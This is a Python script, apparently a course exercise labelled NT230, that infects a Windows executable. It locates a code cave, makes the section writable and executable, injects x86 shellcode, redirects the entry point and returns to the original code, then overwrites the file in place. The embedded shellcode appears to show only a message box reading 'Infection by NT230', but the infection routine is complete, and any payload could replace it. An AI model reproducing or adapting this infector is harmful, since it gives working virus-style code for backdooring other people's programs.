#!/usr/bin/env python3

import sys
import pefile
import argparse

# CLI Argument Inputs
parser = argparse.ArgumentParser(description='Infection by NT230')
parser.add_argument('--file','-fileInfection', dest='file')

args = parser.parse_args()

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():
    global pe
    filedata = open(file, "rb") # Doc File
    print(" Min Cave Size (Size cua lo hong): " + str(minCave) + " bytes")
    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
    caveFound = False
    # Loop through sections to identify code cave of minimum bytes
    # Trong Section chua PointerToRawData 
    for section in pe.sections:
        sectionCount = 0
        if section.SizeOfRawData != 0:
            position = 0
            count = 0
            filedata.seek(section.PointerToRawData, 0)
            data = filedata.read(section.SizeOfRawData) #Doc file tu rawdata
            for byte in data: #data chua 1 chuoi byte
                position += 1
                if byte == 0x00:
                    count += 1
                else:
                    if count > minCave: #minCave la do dai Shell code
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1
                        section.Characteristics = 0xE0000040
                        return vir_addr, raw_addr #raw address là byte thu bao nhieu tren file, vir_addr dia chi ao tren RAM
                    count = 0
        sectionCount += 1
    filedata.close()

# Load file to var
file = args.file 

# Load to pefile object
pe = pefile.PE(file)

shellcode = bytes(
b""
b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31"
b"\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b"
b"\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3"
b"\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45"
b"\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
b"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31"
b"\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
b"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a"
b"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb"
b"\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
b"\x04\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\x68\x6c\x6c"
b"\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72"
b"\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04"
b"\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
b"\xe8\x70\xff\xff\xff\x68\x33\x30\x58\x20\x68\x20"
b"\x4e\x54\x32\x68\x6e\x20\x62\x79\x68\x63\x74\x69"
b"\x6f\x68\x49\x6e\x66\x65\x31\xdb\x88\x5c\x24\x12"
b"\x89\xe3\x68\x36\x33\x58\x20\x68\x35\x32\x31\x39"
b"\x68\x2d\x20\x32\x30\x68\x35\x36\x33\x20\x68\x30"
b"\x35\x32\x31\x68\x20\x2d\x20\x32\x68\x31\x39\x35"
b"\x37\x68\x32\x30\x35\x32\x31\xc9\x88\x4c\x24\x1e"
b"\x89\xe1\x31\xd2\x6a\x40\x53\x51\x52\xff\xd0\x90"
)

# Save file to variable
newFile = args.file
# Stores Image Base
image_base = pe.OPTIONAL_HEADER.ImageBase
minCave = (4 + len(shellcode)) + 10 #Do dai o trong

try:
    newEntryPoint, newRawOffset = FindCave()
except:
    sys.exit(" No Code Cave Found")

# Stores original entrypoint
#Address tren RAM cua chuong trinh. Vi tri dau tien cua program
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint) 
# Sets new Entry Point and aligns address
pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base
returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

# INJECT 
shellcode += (b"\xB8" + returnAddress) #Call Eax dang chua EntryPoint
paddingBytes = b""

#Them padding vao sau Shellcode, dua Entry Point vao` Eax
if len(shellcode) % 4 != 0:
    paddingBytes = b"\x90" * 10
    shellcode += paddingBytes
shellcode += (b"\xFF\xD0") #Mov Eax

#Them padding vao trước shellcode
shellcode = b"\x90\x90\x90\x90" + shellcode 

# Injects Shellcode
pe.set_bytes_at_offset(newRawOffset, shellcode)

# Save and close files
pe.write(newFile)

pe.close()
print("\n")